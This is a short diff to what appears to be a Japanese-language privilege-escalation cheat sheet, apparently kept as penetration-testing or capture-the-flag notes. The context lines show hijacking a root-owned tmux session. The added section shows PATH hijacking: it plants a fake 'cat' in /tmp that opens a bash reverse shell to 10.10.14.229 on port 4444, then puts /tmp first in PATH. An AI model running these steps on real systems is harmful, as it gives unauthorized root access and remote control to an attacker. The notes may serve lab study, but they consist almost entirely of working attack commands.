@@ -24,3 +24,14 @@ ps aux
 root       1027  0.0  0.1  26416  1676 ?        Ss   04:55   0:00 /usr/bin/tmux -S /.devs/dev_sess
 tmux -S /.devs/dev_sess # rootターミナル起動
 ```
+
+# Path hijacking
+絶対パスではなく相対パスでコマンドを呼んでいるプログラムに対して、任意の環境変数を追加し、任意のコマンドを実行させる。
+```bash
+strings /bin/vuln # catを相対パスで呼んでいる。
+cat << EOF > /tmp/cat
+#!/bin/sh
+bash -c 'bash -i >& /dev/tcp/10.10.14.229/4444 0>&1'
+EOF
+export PATH=/tmp:$PATH
+```
